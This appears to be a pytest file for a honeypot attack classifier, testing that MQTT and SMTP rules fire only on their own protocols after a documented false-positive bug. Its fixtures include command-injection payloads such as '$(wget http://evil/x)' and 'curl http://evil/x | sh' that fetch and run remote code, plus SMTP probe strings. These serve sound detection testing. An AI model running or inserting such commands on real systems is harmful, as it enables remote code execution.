"""MQTT and SMTP rules must not fire outside their protocol.

Found on sensor-a 2026-08-27: a sensor with no MQTT listener and no SMTP listener had
events tagged MQTT_ATTACK and SMTP_PROBE. Two independent defects:

  1. The MQTT port gate tested `rname.startswith("mqtt_")` — prefix- and
     case-sensitive. `MQTT_Command_Injection_Detection`, an AI-generated name, was
     the one rule of 34 that escaped it.
  2. That rule's pattern was `\\d{10}` — any ten consecutive digits. It matched the
     callee number in a SIP INVITE, a slice of the MD5 in a PostgreSQL password
     message, and every Unix timestamp. Every production hit was a false positive.

Separately, none of the 11 SMTP_PROBE rules were excluded from HTTP, so an
`EHLO` line inside a multi-protocol scanner probe (LeakIX sends exactly that on
port 80) was reported as an SMTP probe rather than as the scanner it is.
"""

from __future__ import annotations

import pytest

from honeylens.classification.attack_classifier import classify_event_row


def _types(payload, protocol, port):
    return {
        h[0]
        for h in classify_event_row(payload=payload, protocol=protocol, metadata={"dst_port": port})
    }


def _rules(payload, protocol, port):
    return {
        h[1]
        for h in classify_event_row(payload=payload, protocol=protocol, metadata={"dst_port": port})
    }


# ------------------------------------------------------------ real captures

SIP_INVITE = (
    "INVITE sip:+12093569373@203.0.113.9 SIP/2.0\r\n"
    "Via: SIP/2.0/UDP 172.110.223.17:6922;branch=z9hG4bK-524287-1---7a3e2624d\r\n"
)
SIP_OPTIONS = (
    "OPTIONS sip:100@203.0.113.9 SIP/2.0\r\n"
    "Via: SIP/2.0/UDP 154.58.4.13:36573;branch=z9hG4bK-1344247740;rport\r\n"
)
PG_PASSWORD = "p\x00\x00\x00(md5cfda89832d585d192c573846181026bd\x00"


@pytest.mark.parametrize(
    "payload,proto,port,what",
    [
        (SIP_INVITE, "SIP", 5060, "a SIP INVITE — the digits are a phone number"),
        (SIP_OPTIONS, "SIP", 5080, "a SIP OPTIONS scan"),
        (PG_PASSWORD, "TCP", 5432, "a PostgreSQL password message"),
        ("session=1724692800 ok", "TCP", 8080, "a Unix timestamp"),
    ],
)
def test_non_mqtt_traffic_is_never_mqtt_attack(payload, proto, port, what):
    assert "MQTT_ATTACK" not in _types(payload, proto, port), what


def test_mqtt_command_injection_needs_an_actual_injection():
    """On an MQTT port, ten digits still must not be enough."""
    assert "MQTT_Command_Injection_Detection" not in _rules(
        "telemetry/sensor1 1724692800", "MQTT", 1883
    )


@pytest.mark.parametrize(
    "payload",
    [
        "cmd/run `id`",
        "topic $(wget http://evil/x)",
        "device/set; curl http://evil/x | sh",
        "a|/bin/sh",
    ],
)
def test_real_injection_on_an_mqtt_port_still_fires(payload):
    assert "MQTT_Command_Injection_Detection" in _rules(payload, "MQTT", 1883)


def test_injection_shape_off_an_mqtt_port_is_not_mqtt():
    """The same string on a web port is somebody else's problem, not MQTT's."""
    assert "MQTT_ATTACK" not in _types("x=`id`", "HTTP", 8080)


# ------------------------------------------------------------------- SMTP

LEAKIX = "GET / HTTP/1.1\r\nHost: x\r\n\r\nHELP\r\nEHLO leakix.net\r\n"


def test_smtp_verbs_inside_http_are_not_an_smtp_probe():
    assert "SMTP_PROBE" not in _types(LEAKIX, "HTTP", 80)


def test_the_scanner_is_still_identified():
    """Nothing is lost by the gate — the scanner rule already names it."""
    assert any("leakix" in r.lower() for r in _rules(LEAKIX, "HTTP", 80))


@pytest.mark.parametrize(
    "payload,port",
    [
        ("EHLO attacker.example\r\n", 25),
        ("VRFY root\r\n", 587),
        ("RCPT TO:<victim@example.com>\r\n", 465),
    ],
)
def test_smtp_rules_still_fire_on_smtp_ports(payload, port):
    assert "SMTP_PROBE" in _types(payload, "SMTP", port)


# ------------------------------------------------------------- the structural fix


def test_the_gate_is_keyed_on_attack_type_not_the_rule_name():
    """A rule named MQTT_* must be gated exactly like one named mqtt_*."""
    from honeylens.classification.text_rules import _RULES

    off_prefix = [n for a, n, _ in _RULES if a == "MQTT_ATTACK" and not n.startswith("mqtt_")]
    assert off_prefix, "fixture assumption: at least one MQTT rule is not mqtt_-prefixed"
    for name in off_prefix:
        assert "MQTT_ATTACK" not in _types("x=`id` 1724692800", "HTTP", 8080), (
            f"{name} escapes the MQTT port gate"
        )
